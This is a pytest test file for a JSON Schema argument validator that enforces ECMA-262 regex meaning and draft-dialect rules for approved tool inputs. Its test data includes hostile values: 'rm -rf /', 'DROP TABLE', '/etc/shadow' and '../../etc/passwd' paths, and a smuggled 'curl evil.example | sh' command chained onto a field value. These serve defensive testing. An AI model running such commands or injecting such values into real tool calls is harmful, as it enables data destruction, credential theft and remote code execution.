"""Approved input schemas are evaluated in their declared dialect with ECMA-262 patterns."""

from __future__ import annotations

import os
import re
import subprocess
import sys
import time

import pytest

import nexus_symbiote.runtime_validation as validation


def outcome(schema, arguments):
    try:
        validation.validate_arguments(schema, arguments)
    except validation.ValidationBudgetError as exc:
        return exc.reason
    return "valid"


def string_schema(pattern):
    return {"type": "object", "properties": {"value": {"type": "string", "pattern": pattern}}}


@pytest.mark.parametrize(
    ("pattern", "value", "expected"),
    [
        # Python's $ also matches before a final newline; ECMA-262's does not.
        ("^[a-z0-9.-]+$", "example.org", "valid"),
        ("^[a-z0-9.-]+$", "example.org\n", "arguments-invalid"),
        # \d and \w are ASCII in ECMA-262, Unicode-aware in Python.
        (r"^\d+$", "34", "valid"),
        (r"^\d+$", "٣٤", "arguments-invalid"),
        (r"^\w+$", "café", "arguments-invalid"),
        # "." excludes all ECMA-262 line terminators, including U+2028.
        ("^.+$", "a b", "arguments-invalid"),
        # \s includes NO-BREAK SPACE in ECMA-262, so \S must not match it.
        (r"^\S+$", "a b", "arguments-invalid"),
        (r"^[\d-]+$", "12-34", "valid"),
        (r"^[\d-]+$", "١-2", "arguments-invalid"),
        (r"^(?<year>\d{4})-\k<year>$", "2026-2026", "valid"),
        (r"^(?<year>\d{4})-\k<year>$", "2026-2027", "arguments-invalid"),
        # A hyphen next to a class escape is a literal when it cannot form a range.
        (r"^[\w-]+$", "a-b_c", "valid"),
        (r"^[-\w]+$", "-a", "valid"),
        (r"^[\w.-]+$", "a.b-c", "valid"),
        (r"^[a-z-\d]+$", "a-1", "valid"),
        (r"^[a-z-\d]+$", "A", "arguments-invalid"),
        # Class complements: [\s\S] is any character, [^\S] whitespace only.
        (r"^[\s\S]+$", "a\nb\u2028", "valid"),
        (r"^[^\S]+$", " \t\ufeff", "valid"),
        (r"^[^\S]+$", "a", "arguments-invalid"),
        (r"^[\S^]+$", "^a", "valid"),
        (r"^[\S^]+$", " ", "arguments-invalid"),
        (r"^[^a\S]+$", " ", "valid"),
        (r"^[^a\S]+$", "a", "arguments-invalid"),
        # An octal escape keeps its own meaning next to a \d expansion.
        (r"^[\0\d]+$", "\x0009", "valid"),
        (r"^[\0\d]+$", "-", "arguments-invalid"),
        (r"^[\12\d]$", "\n", "valid"),
        (r"^[\12\d]$", ".", "arguments-invalid"),
        # Python's \B never matches an empty string; ECMA-262's does.
        (r"^\B$", "", "valid"),
        ("^a{2}$", "aa", "valid"),
        ("^a{2}$", "aaa", "arguments-invalid"),
        # A brace that cannot be a quantifier is a literal in both engines.
        ("^a{1$", "a{1", "valid"),
        # With the u flag, an escaped surrogate pair is one code point.
        (r"^\uD83D\uDE00+$", "\U0001f600\U0001f600", "valid"),
        (r"^[\uD83D\uDE00-\uD83D\uDE4F]$", "\U0001f64f", "valid"),
        (r"^[\uD83D\uDE00-\uD83D\uDE4F]$", "\ue000", "arguments-invalid"),
        # Annex B syntax keeps its meaning while a pattern names only BMP characters.
        (r"^\-?\d+$", "-12", "valid"),
        (r"^\-?\d+$", "12-", "arguments-invalid"),
    ],
)
def test_patterns_have_ecma_262_meaning(pattern, value, expected):
    assert outcome(string_schema(pattern), {"value": value}) == expected


def test_pattern_properties_and_additional_properties_use_ecma_anchors():
    schema = {
        "type": "object",
        "patternProperties": {"^x$": {"type": "integer"}},
        "additionalProperties": False,
    }
    assert outcome(schema, {"x": 1}) == "valid"
    assert outcome(schema, {"x\n": 1}) == "arguments-invalid"


@pytest.mark.parametrize(
    "pattern",
    [
        "(?i)abc",
        "(?P<name>a)",
        "(?#comment)a",
        r"\Aabc",
        r"abc\Z",
        "[]a]",
        "a\\",
        # Python reads these as possessive quantifiers; ECMA-262 rejects them.
        "^a*+$",
        "^a++$",
        "^a?+$",
        "^a{2}+$",
        # Python reads these as {0,2} and {0,}; ECMA-262 reads literal braces or rejects them.
        "^a{,2}$",
        "^a{,}$",
        # Quantified assertions, and escapes without a meaning in a class.
        "^(?=a)*a$",
        "(?<=a)+b",
        r"\b+",
        r"[\B]",
        r"^\x4$",
        r"^\u{41}$",
        r"^[\400]$",
        # Annex B syntax counts UTF-16 code units, so it is refused next to characters
        # outside the BMP.
        r"[\7-\uD83D\uDE4F]",
        r"^\-[\uD83D\uDE00-\uD83D\uDE4F]$",
        "^]\U0001f600$",
        "^\U0001f600{$",
        r"^\01\uD83D\uDE00$",
    ],
)
def test_pattern_syntax_without_an_ecma_262_meaning_makes_the_schema_invalid(pattern):
    with pytest.raises(re.error):
        validation.ecma_pattern(pattern)
    assert outcome(string_schema(pattern), {"value": "abc"}) == "schema-invalid"


@pytest.mark.parametrize(
    "pattern",
    [
        # ECMA-262 matches a reference to a group that did not take part as the empty
        # string and resets the captures of a loop on each iteration; Python fails the
        # reference and keeps the captures of earlier iterations.
        r"""^(['"])?rm\1\s""",
        r"""^(?:(['"])?[\w.-]+\1(?:,|$))+$""",
        r"""^(['"])?[a-z]+\1$""",
        r"^(?:(a)|b)\1$",
        r"^(?:(a)|b)+\1$",
        r"^(a)*\1$",
        r"^(a){2}\1$",
        r"^(?=(a))\1",
        r"^(?!(a))\1b$",
        r"^(?<n>a)?\k<n>b$",
        r"^(?:(?<n>a)|b)+\k<n>$",
        # A group in any alternative is refused, even where both engines agree.
        r"^(a)\1$|^b$",
        # References before or inside their group, in a lookbehind, or to no group.
        r"^\1(a)$",
        r"^(a\1)$",
        r"^(a)(?<=\1)b$",
        r"^\k<n>(?<n>a)$",
        r"^(a)\2$",
        r"^(a)\k<m>$",
        r"^(a)\10$",
        # Python reads \100 as an octal escape, ECMA-262 as a reference to group 100.
        "^" + "(a)" * 100 + r"\100$",
    ],
)
def test_backreference_to_a_group_that_may_not_take_part_makes_the_schema_invalid(pattern):
    with pytest.raises(re.error, match="backreference"):
        validation.ecma_pattern(pattern)
    assert outcome(string_schema(pattern), {"value": "a"}) == "schema-invalid"


@pytest.mark.parametrize(
    ("schema", "arguments"),
    [
        # Read with Python semantics, each schema admitted arguments that ECMA-262 rejects.
        (
            {"properties": {"cmd": {"type": "string", "not": {"pattern": r"""^(['"])?rm\1\s"""}}}},
            {"cmd": "rm -rf /"},
        ),
        (
            {"properties": {"cols": {"pattern": r"""^(?:(['"])?[\w.-]+\1(?:,|$))+$"""}}},
            {"cols": "'a',b'"},
        ),
        (
            {"patternProperties": {r"""^(['"])?[a-z]+\1$""": {"type": "integer"}}},
            {"limit": "DROP TABLE"},
        ),
    ],
)
def test_schema_with_a_conditional_backreference_is_refused(schema, arguments):
    assert outcome({"type": "object", **schema}, arguments) == "schema-invalid"


@pytest.mark.parametrize(
    ("pattern", "value", "expected"),
    [
        (r"""^(['"]).*\1$""", "'abc'", "valid"),
        (r"""^(['"]).*\1$""", "'abc\"", "arguments-invalid"),
        (r"""^(?<q>['"])\w+\k<q>$""", '"abc"', "valid"),
        (r"""^(?<q>['"])\w+\k<q>$""", "\"abc'", "arguments-invalid"),
        (r"^(a|b)\1$", "bb", "valid"),
        (r"^(a|b)\1$", "ab", "arguments-invalid"),
        (r"^(x)(?:\1|y)+$", "xxyx", "valid"),
        (r"^(x)(?:\1|y)+$", "xz", "arguments-invalid"),
        (r"^((a)b)\2\1$", "abaab", "valid"),
    ],
)
def test_backreference_to_a_group_that_always_takes_part_keeps_its_meaning(
    pattern, value, expected
):
    assert outcome(string_schema(pattern), {"value": value}) == expected


@pytest.mark.parametrize(
    "pattern",
    [
        "(" * 20000 + "a" + ")" * 20000,
        "(a)" + "(?<=" * 10000 + "b" + ")" * 10000 + "(?=" * 10000 + r"\1" * 10000 + ")" * 10000,
    ],
)
def test_backreference_bookkeeping_stays_linear_on_deep_nesting(pattern):
    # Bookkeeping that grew with the nesting depth squared spent the worker's budget
    # before Python, which cannot compile such nesting, was reached.
    start = time.monotonic()
    validation.ecma_pattern(pattern)
    assert time.monotonic() - start < 1
    assert outcome(string_schema(pattern), {"value": "a"}) == "schema-invalid"


@pytest.mark.parametrize(
    ("pattern", "value"),
    [
        (r"^[\s\W]*$", " " * 64 + "a"),
        (r"^[\D.]+$", "." * 400 + "1"),
        (r"^[a\D]*$", "a" * 64 + "1"),
    ],
)
def test_class_complements_do_not_backtrack_on_hostile_input(pattern, value):
    # Overlapping members such as \s and \W became an ambiguous alternation that
    # backtracked exponentially and held a validation slot until its deadline.
    assert outcome(string_schema(pattern), {"value": value}) == "arguments-invalid"


@pytest.mark.parametrize(
    ("pattern", "outside"),
    [
        (r"^[%-\w]+$", "<script>"),
        (r"^[\w-z]+$", "a`b"),
        (r"^[.-\w]+$", ":;<=>?@"),
        (r"^[+-\d]+$", ",./"),
        (r"^[^\w-z]+$", "-"),
        (r"^[--\w]+$", "."),
        (r"^[\x00-\s]+$", "\x01"),
    ],
)
def test_class_escape_as_a_range_bound_makes_the_schema_invalid(pattern, outside):
    # Python would read the expansion of \w, \d or \s as a wider range and admit
    # characters the class excludes. ECMA-262 with the u flag rejects the pattern.
    with pytest.raises(re.error, match="range"):
        validation.ecma_pattern(pattern)
    assert outcome(string_schema(pattern), {"value": outside}) == "schema-invalid"


def test_draft_07_schema_is_evaluated_as_draft_07():
    schema = {
        "$schema": "http://json-schema.org/draft-07/schema#",
        "type": "object",
        "dependencies": {"delete": ["confirm"]},
    }
    assert outcome(schema, {"delete": True, "confirm": True}) == "valid"
    assert outcome(schema, {"delete": True}) == "arguments-invalid"


@pytest.mark.parametrize("dialect", validation.DIALECTS)
def test_every_supported_dialect_validates(dialect):
    schema = {"$schema": dialect, "type": "object", "required": ["to"]}
    assert outcome(schema, {"to": "team@example.test"}) == "valid"
    assert outcome(schema, {}) == "arguments-invalid"


@pytest.mark.parametrize(
    "declared",
    [
        "http://json-schema.org/draft-03/schema#",
        "https://example.test/custom-dialect",
        "http://json-schema.org/schema#",
        7,
    ],
)
def test_unknown_or_unsupported_dialect_is_refused(declared):
    assert outcome({"$schema": declared, "type": "object"}, {}) == "schema-invalid"


DRAFT_04 = "http://json-schema.org/draft-04/schema#"
DRAFT_07 = "http://json-schema.org/draft-07/schema#"


@pytest.mark.parametrize(
    "schema",
    [
        # Draft-04 to draft-07 ignore the siblings of "$ref".
        {
            "$schema": DRAFT_07,
            "definitions": {"id": {"type": "string"}},
            "properties": {"v": {"$ref": "#/definitions/id", "maxLength": 3}},
        },
        # Keywords that the declared draft does not define are not applied.
        {"$schema": DRAFT_04, "properties": {"v": {"const": "read"}}},
        {"$schema": DRAFT_07, "properties": {"v": {"dependentRequired": {"a": ["b"]}}}},
        {"properties": {"v": {}}, "dependencies": {"v": ["confirm"]}},
        {"properties": {"v": {"type": "array", "additionalItems": False}}},
        # A reference target outside the usual keywords is checked too.
        {
            "$schema": DRAFT_04,
            "properties": {"v": {"$ref": "#/x-shared/read"}},
            "x-shared": {"read": {"const": "read"}},
        },
    ],
)
def test_constraint_the_declared_dialect_ignores_makes_the_schema_invalid(schema):
    # An approver reads these constraints, but the declared dialect would not enforce
    # them, so the call is denied instead of admitted without them.
    assert outcome({"type": "object", **schema}, {"v": "toolong"}) == "schema-invalid"


DRAFT_03 = "http://json-schema.org/draft-03/schema#"
DRAFT_06 = "http://json-schema.org/draft-06/schema#"
DRAFT_2019 = "https://json-schema.org/draft/2019-09/schema"


@pytest.mark.parametrize(
    ("schema", "arguments"),
    [
        # minContains and maxContains are 2019-09 keywords; draft-06 and draft-07 ignore them.
        (
            {
                "$schema": DRAFT_07,
                "properties": {
                    "to": {"type": "array", "contains": {"const": "all-staff"}, "maxContains": 0}
                },
            },
            {"to": ["all-staff"]},
        ),
        (
            {
                "$schema": DRAFT_06,
                "properties": {
                    "by": {"type": "array", "contains": {"const": "lead"}, "minContains": 2}
                },
            },
            {"by": ["lead"]},
        ),
        # A reference by URI resolves through an $id or id to targets the check missed.
        (
            {
                "$schema": DRAFT_07,
                "$id": "https://tools.example.test/run",
                "definitions": {"s": {"type": "string"}},
                "properties": {"path": {"$ref": "https://tools.example.test/run#/x-path"}},
                "x-path": {"$ref": "#/definitions/s", "maxLength": 3},
            },
            {"path": "/etc/shadow"},
        ),
        (
            {
                "$schema": DRAFT_04,
                "id": "https://tools.example.test/run",
                "properties": {"op": {"$ref": "run#/x-op"}},
                "x-op": {"const": "read"},
            },
            {"op": "delete"},
        ),
        # An id below the root changes the base that "#/x" resolves against.
        (
            {
                "$schema": DRAFT_04,
                "x": {},
                "properties": {
                    "op": {
                        "id": "https://tools.example.test/op",
                        "x": {"const": "read"},
                        "allOf": [{"$ref": "#/x"}],
                    }
                },
            },
            {"op": "delete"},
        ),
        # jsonschema switches dialect at a subschema with its own $schema, draft-03 too.
        ({"properties": {"op": {"$schema": DRAFT_04, "const": "read"}}}, {"op": "delete"}),
        (
            {
                "properties": {
                    "op": {
                        "$schema": DRAFT_03,
                        "type": "string",
                        "not": {"enum": ["delete"]},
                        "anyOf": [{"const": "read"}, {"const": "list"}],
                    }
                }
            },
            {"op": "delete"},
        ),
        (
            {"properties": {"opts": {"$schema": DRAFT_03, "required": ["dry_run"]}}},
            {"opts": {}},
        ),
        # 2019-09 resolves "$recursiveRef" as "#" whatever it names.
        (
            {
                "$schema": DRAFT_2019,
                "type": ["object", "integer"],
                "$defs": {"small": {"maximum": 3}},
                "properties": {"n": {"$recursiveRef": "#/$defs/small"}},
            },
            {"n": 10},
        ),
    ],
)
def test_constraint_that_evaluation_would_skip_makes_the_schema_invalid(schema, arguments):
    assert outcome({"type": "object", **schema}, arguments) == "schema-invalid"


@pytest.mark.parametrize(
    "schema",
    [
        {"$defs": {"s": {"$anchor": "s", "maxLength": 3}}, "properties": {"v": {"$ref": "#s"}}},
        {"$defs": {"s": {"$dynamicAnchor": "s"}}, "properties": {"v": {"$dynamicRef": "#s"}}},
        {"properties": {"v": {"$ref": ""}}},
        {"properties": {"v": {"$ref": "#/$defs/missing"}}},
        {"$defs": {"unused": {"$ref": "#/$defs/missing"}}},
        {"x": ["a"], "properties": {"v": {"$ref": "#/x/0"}}},
        {"x-s": {"$schema": 7}, "properties": {"v": {"$ref": "#/x-s"}}},
        {"$defs": {"s": {"$id": "https://tools.example.test/s"}}},
    ],
)
def test_references_the_check_cannot_follow_make_the_schema_invalid(schema):
    # References are followed only as JSON Pointers within the schema document.
    assert outcome({"type": "object", **schema}, {"v": "toolong"}) == "schema-invalid"


def test_references_and_dialect_declarations_within_the_schema_stay_valid():
    schema = {
        "$schema": DRAFT_07,
        "$id": "https://tools.example.test/run",
        "definitions": {
            "path": {"$schema": DRAFT_07.removesuffix("#"), "type": "string", "maxLength": 8},
            "node": {
                "$id": "#node",
                "type": "object",
                "properties": {"next": {"$ref": "#/definitions/node"}},
                "additionalProperties": False,
            },
        },
        "x-list": [{"type": "integer", "maximum": 3}],
        "properties": {
            "path": {"$ref": "#/definitions/path"},
            "tree": {"$ref": "#/definitions/node"},
            "n": {"$ref": "#/x-list/0"},
        },
    }
    assert outcome(schema, {"path": "/srv/a", "tree": {"next": {}}, "n": 3}) == "valid"
    assert outcome(schema, {"path": "/etc/shadow"}) == "arguments-invalid"
    assert outcome(schema, {"tree": {"next": {"other": 1}}}) == "arguments-invalid"
    assert outcome(schema, {"n": 4}) == "arguments-invalid"


def test_contains_bounds_apply_from_2019_09():
    schema = {
        "$schema": DRAFT_2019,
        "type": "object",
        "properties": {
            "to": {"type": "array", "contains": {"const": "all-staff"}, "maxContains": 1}
        },
    }
    assert outcome(schema, {"to": ["all-staff", "team"]}) == "valid"
    assert outcome(schema, {"to": ["all-staff", "all-staff"]}) == "arguments-invalid"


DRAFT_2020 = "https://json-schema.org/draft/2020-12/schema"


@pytest.mark.parametrize("dialect", [DRAFT_04, DRAFT_2020])
@pytest.mark.parametrize(
    ("constraint", "arguments"),
    [
        # Draft-03 assertions and applicators that no later draft defines.
        ({"type": "integer", "divisibleBy": 2}, {"v": 3}),
        ({"disallow": ["string"]}, {"v": "x"}),
        ({"extends": {"type": "integer"}}, {"v": "x"}),
        ({"type": "string", "extends": {"pattern": "^/srv/safe/"}}, {"v": "/etc/shadow"}),
        # Draft-01 and draft-02 ones.
        ({"requires": "confirm"}, {"v": 1}),
        ({"minimum": 0, "minimumCanEqual": False}, {"v": 0}),
        ({"maximum": 0, "maximumCanEqual": False}, {"v": 0}),
        ({"maxDecimal": 0}, {"v": 1.5}),
        ({"optional": False}, {}),
    ],
)
def test_constraint_only_a_draft_before_draft_04_defines_makes_the_schema_invalid(
    dialect, constraint, arguments
):
    # Each constraint was skipped as an annotation, which admitted these arguments.
    schema = {"$schema": dialect, "type": "object", "properties": {"v": constraint}}
    assert outcome(schema, arguments) == "schema-invalid"


def test_retired_constraint_is_found_wherever_the_schema_applies_it():
    schema = {
        "type": "object",
        "$defs": {"path": {"type": "string", "disallow": [{"pattern": "\\.\\."}]}},
        "properties": {"path": {"allOf": [{"$ref": "#/$defs/path"}]}},
    }
    assert outcome(schema, {"path": "../../etc/passwd"}) == "schema-invalid"


def test_retired_keyword_names_outside_constraint_positions_stay_valid():
    schema = {
        "type": "object",
        "properties": {
            "extends": {"type": "string", "default": {"divisibleBy": 2}},
            "requires": {"type": "array", "items": {"enum": ["disallow", "maxDecimal"]}},
            "note": {"type": "string", "optional": True},
        },
        "required": ["extends"],
        "x-vendor": {"divisibleBy": 2, "optional": False},
    }
    assert outcome(schema, {"extends": "base", "requires": ["disallow"]}) == "valid"
    assert outcome(schema, {"extends": "base", "note": 1}) == "arguments-invalid"
    assert outcome(schema, {"requires": []}) == "arguments-invalid"


def array_schema(constraints, extra=None, *, dialect=DRAFT_2019):
    return {
        "$schema": dialect,
        "type": "object",
        **(extra or {}),
        "properties": {"l": {"type": "array", **constraints}},
    }


OK = {"const": "ok"}
CONTAINS_DEF = {"$defs": {"c": {"contains": OK}}}


@pytest.mark.parametrize(
    ("schema", "arguments"),
    [
        (array_schema({"contains": OK, "unevaluatedItems": False}), {"l": ["ok"]}),
        (
            array_schema(
                {
                    "items": [{"type": "integer"}],
                    "contains": {"type": "string"},
                    "unevaluatedItems": False,
                }
            ),
            {"l": [1, "foo"]},
        ),
        (array_schema({"contains": True, "unevaluatedItems": False}), {"l": [1]}),
        (array_schema({"allOf": [{"contains": OK}], "unevaluatedItems": False}), {"l": ["ok"]}),
        (array_schema({"anyOf": [{"contains": OK}], "unevaluatedItems": False}), {"l": ["ok"]}),
        (array_schema({"oneOf": [{"contains": OK}], "unevaluatedItems": False}), {"l": ["ok"]}),
        (array_schema({"if": {"contains": OK}, "unevaluatedItems": False}), {"l": ["ok"]}),
        (
            array_schema(
                {"if": {"minItems": 1}, "then": {"contains": OK}, "unevaluatedItems": False}
            ),
            {"l": ["ok"]},
        ),
        (
            array_schema(
                {"if": {"minItems": 5}, "else": {"contains": OK}, "unevaluatedItems": False}
            ),
            {"l": ["ok"]},
        ),
        # Applied in place too, though jsonschema does not count them today.
        (
            array_schema({"not": {"contains": {"const": "x"}}, "unevaluatedItems": False}),
            {"l": ["ok"]},
        ),
        (
            array_schema({"dependentSchemas": {"x": {"contains": OK}}, "unevaluatedItems": False}),
            {"l": ["ok"]},
        ),
        (
            array_schema({"$ref": "#/$defs/c", "unevaluatedItems": False}, CONTAINS_DEF),
            {"l": ["ok"]},
        ),
        (
            array_schema(
                {"allOf": [{"$ref": "#/$defs/c"}], "unevaluatedItems": False}, CONTAINS_DEF
            ),
            {"l": ["ok"]},
        ),
        (
            array_schema(
                {"$recursiveRef": "#", "unevaluatedItems": False},
                {"type": ["object", "array"], "contains": OK},
            ),
            {"l": ["ok"]},
        ),
        # A satisfiable schema: an item that matches contains skipped the item constraint.
        (
            array_schema(
                {
                    "contains": {"type": "string", "pattern": "^ticket-"},
                    "unevaluatedItems": {"type": "string", "pattern": "^[a-z0-9-]{1,32}$"},
                }
            ),
            {"l": ["ticket-1; curl evil.example | sh #"]},
        ),
    ],
)
def test_2019_09_unevaluated_items_where_contains_applies_makes_the_schema_invalid(
    schema, arguments
):
    # jsonschema counts the items that contains matched as evaluated, as 2020-12 does;
    # 2019-09 contains makes no annotation, so the declared dialect rejects them.
    assert outcome(schema, arguments) == "schema-invalid"


def test_2019_09_unevaluated_items_without_contains_at_its_location_still_applies():
    alone = array_schema({"items": [{"type": "integer"}], "unevaluatedItems": False})
    assert outcome(alone, {"l": [1]}) == "valid"
    assert outcome(alone, {"l": [1, "x"]}) == "arguments-invalid"
    # contains below an item or on another property applies at another location.
    elsewhere = array_schema(
        {"items": [{"type": "array", "contains": OK}], "unevaluatedItems": False}
    )
    elsewhere["properties"]["tags"] = {"type": "array", "contains": OK}
    assert outcome(elsewhere, {"l": [["ok"]], "tags": ["ok"]}) == "valid"
    assert outcome(elsewhere, {"l": [["ok"], "ok"]}) == "arguments-invalid"
    # A sibling's contains is not adjacent to unevaluatedItems in either dialect.
    sibling = array_schema({"allOf": [{"contains": OK}, {"unevaluatedItems": False}]})
    assert outcome(sibling, {"l": ["ok"]}) == "arguments-invalid"


def test_2020_12_counts_contains_as_evaluated():
    schema = array_schema({"contains": OK, "unevaluatedItems": False}, dialect=DRAFT_2020)
    assert outcome(schema, {"l": ["ok"]}) == "valid"
    assert outcome(schema, {"l": ["ok", "other"]}) == "arguments-invalid"


def test_2019_09_contains_check_work_grows_linearly(monkeypatch):
    from jsonschema import Draft201909Validator

    resolved = []
    reference_target = validation._reference_target

    def counted(*args):
        resolved.append(args)
        return reference_target(*args)

    monkeypatch.setattr(validation, "_reference_target", counted)

    def work(length):
        # A long chain of unevaluatedItems through references that no contains reaches.
        defs = {
            f"d{index}": {"$ref": f"#/$defs/d{index + 1}", "unevaluatedItems": False}
            for index in range(length)
        }
        schema = {"$defs": {**defs, f"d{length}": {}, "c": {"contains": OK}}}
        resolved.clear()
        assert not validation._ignores_a_keyword(schema, DRAFT_2019, Draft201909Validator)
        return len(resolved)

    # At most one lookup per reference in the walk and one in the 2019-09 check.
    small, large = work(1000), work(2000)
    assert large == 2 * small
    assert small <= 2 * 1000


@pytest.mark.parametrize(
    ("bound", "keyword", "inside"),
    [("minimum", "exclusiveMinimum", 1), ("maximum", "exclusiveMaximum", -1)],
)
def test_draft_04_boolean_exclusive_bounds_are_enforced(bound, keyword, inside):
    # Draft-04's minimum and maximum consult the boolean form; draft-06 made it a number.
    schema = {
        "$schema": DRAFT_04,
        "type": "object",
        "properties": {"n": {"type": "integer", bound: 0, keyword: True}},
    }
    assert outcome(schema, {"n": inside}) == "valid"
    assert outcome(schema, {"n": 0}) == "arguments-invalid"
    schema["properties"]["n"][keyword] = 0
    assert outcome(schema, {"n": inside}) == "schema-invalid"


def test_annotations_next_to_ref_and_root_references_stay_valid():
    schema = {
        "$schema": DRAFT_07,
        "$ref": "#/definitions/mail",
        "definitions": {
            "mail": {
                "type": "object",
                "properties": {
                    "to": {"$ref": "#/definitions/address", "description": "Recipient"},
                    "at": {"$ref": "#/definitions/address", "format": "email"},
                },
                "required": ["to"],
            },
            "address": {"type": "string", "maxLength": 20},
        },
    }
    assert outcome(schema, {"to": "team@example.test"}) == "valid"
    assert outcome(schema, {"to": "x" * 21}) == "arguments-invalid"
    assert outcome(schema, {}) == "arguments-invalid"


def test_siblings_of_ref_apply_from_2019_09():
    schema = {
        "type": "object",
        "$defs": {"id": {"type": "string"}},
        "properties": {"v": {"$ref": "#/$defs/id", "maxLength": 3}},
    }
    assert outcome(schema, {"v": "abc"}) == "valid"
    assert outcome(schema, {"v": "toolong"}) == "arguments-invalid"


def test_ecma_self_check_detects_python_regex_semantics():
    # The worker installs the translation on private jsonschema modules. If one of
    # them evaluated patterns with Python's re again, the self-check must notice.
    probe = (
        "import re, jsonschema._keywords, jsonschema._utils\n"
        "from nexus_symbiote import runtime_validation as v\n"
        "dialects = v._load_dialects()\n"
        "results = [v._ecma_semantics_hold(dialects)]\n"
        "for module in (jsonschema._keywords, jsonschema._utils):\n"
        "    patched, module.re = module.re, re\n"
        "    results.append(v._ecma_semantics_hold(dialects))\n"
        "    module.re = patched\n"
        "print(results)\n"
    )
    result = subprocess.run(  # noqa: S603
        [sys.executable, "-I", "-c", probe],
        capture_output=True,
        text=True,
        env={"PATH": os.defpath},
        timeout=60,
        check=True,
    )
    assert result.stdout.strip() == "[True, False, False]"


def test_worker_whose_self_check_fails_does_not_start(monkeypatch):
    script = (
        "import re, jsonschema._keywords\n"
        "from nexus_symbiote import runtime_validation as v\n"
        "load = v._load_dialects\n"
        "def python_semantics():\n"
        "    dialects = load()\n"
        "    jsonschema._keywords.re = re\n"
        "    return dialects\n"
        "v._load_dialects = python_semantics\n"
        "raise SystemExit(v._worker())\n"
    )
    monkeypatch.setattr(validation, "_WORKER_COMMAND", (sys.executable, "-I", "-c", script))
    with pytest.raises(validation.ValidationBudgetError) as denied:
        validation.validate_arguments(string_schema("^a$"), {"value": "a\n"})
    assert denied.value.reason == "validation-unavailable"
